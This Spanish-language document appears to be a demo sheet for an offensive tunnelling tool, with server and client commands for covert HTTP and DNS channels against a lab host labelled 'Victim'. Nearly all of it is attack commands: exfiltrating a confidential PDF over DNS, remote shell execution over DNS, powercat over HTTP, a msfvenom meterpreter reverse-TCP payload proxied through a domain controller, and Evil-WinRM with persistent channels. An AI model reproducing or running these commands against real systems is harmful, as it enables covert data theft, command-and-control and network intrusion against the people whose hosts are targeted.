# DEMO 1: Canalizando por HTTP

## GET (URI)

Servidor:
```
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k securekeyblabla -vv
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:http -w "--hostname 192.168.122.209 --port 80" -k securekeyblabla -vv
```

## GET (custom URI)

Servidor:
```
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k securekeyblabla -vv -w "--uri /?token="
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:http -w "--hostname 192.168.122.209 --port 80 --uri /?token=" -k securekeyblabla -vv
```

## GET (header)

Servidor:
```
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k securekeyblabla -vv -w "--header laravel_session"
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:http -w "--hostname 192.168.122.209 --port 80 --header laravel_session" -k securekeyblabla -vv
```

## POST (data)

Servidor:
```
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k securekeyblabla -vv -w "--method POST --post-field data"
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:http -w "--hostname 192.168.122.209 --port 80 --method POST --post-field data" -k securekeyblabla -vv
```

# DEMO 2: Canalizando por DNS

## TXT Query

Servidor:
```
./ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -k securekeyblabla -vv
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:dns -w "--hostname 192.168.122.209 --port 53" -k securekeyblabla -vv
```

## MX Query

Servidor:
```
./ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -k securekeyblabla -vv -w "--queries MX"
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:dns -w "--hostname 192.168.122.209 --port 53 --query MX" -k securekeyblabla -vv
```

# DEMO 3: Exfiltración de ficheros DNS

Servidor:
```
./ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -k securekeyblabla -vv -w "--queries MX" > confidential.pdf
```

Cliente (desde cmd)
```
type "Confidential Document Form CDF - 006575.PDF" | C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m io:dns -w "--hostname 192.168.122.209 --port 53 --query MX --multiple --max-size 150" -k securekeyblabla -vv
```

Cliente (Desde PS)
```
Get-FileHash -Algorithm md5 '.\Confidential Document Form CDF - 006575.PDF'
```

# DEMO 4: Ejecución remota de comandos

Servidor
```
./ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -k securekeyblabla -vv
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m shell:dns -w "--hostname 192.168.122.209 --port 53" -k securekeyblabla -vv
```

# DEMO 5: Powercat sobre HTTP con tcplisten + io

Servidor
```
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k securekeyblabla -vv
```

Cliente
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m tcplisten:http -w "--hostname 192.168.122.209 --port 80" -o "--address 127.0.0.1 --port 4444"  -k securekeyblabla -vv
powercat -c 127.0.0.1 -p 4444 -ep
```
# DEMO 6: Meterpreter sobre DNS, usando el DC como proxy para salir

Payload:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f exe -o mtpt_localhost_4444.exe
```

Servidor
```
./ms.py -m tcpconnect:dns -s "--hostname 0.0.0.0 --port 53" -w "--domains customdomain.com" -k securekeyblabla -vv -o "--address 127.0.0.1 --port 5555"
(msfconsole) handler -p windows/x64/meterpreter_reverse_tcp -P 5555 -H 127.0.0.1
```

Cliente:
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m tcplisten:dns -w "--hostname dc1.lab.local --port 53 --domain customdomain.com" -o "--address 127.0.0.1 --port 4444"  -k securekeyblabla -vv
.\mtpt_localhost_4444.exe
```

# DEMO 7: Evil-WinRM sobre DNS, usando el DC como proxy + canales persistentes

Servidor
```
./ms.py -m tcplisten:dns -s "--hostname 0.0.0.0 --port 53" -w "--domains customdomain.com" -k securekeyblabla -vv -o "--address 127.0.0.1 --port 5555 --persist"
evil-winrm -u Administrador -i 127.0.0.1 -P 5555
```

Cliente
```
C:\Users\Victim\AppData\Local\Programs\Python\Python38-32\python.exe .\mc.py -m tcpconnect:dns -w "--hostname 192.168.122.209 --port 53 --domain customdomain.com" -o "--address filesrv.lab.local --port 5985 --persist" -k securekeyblabla -vv
```
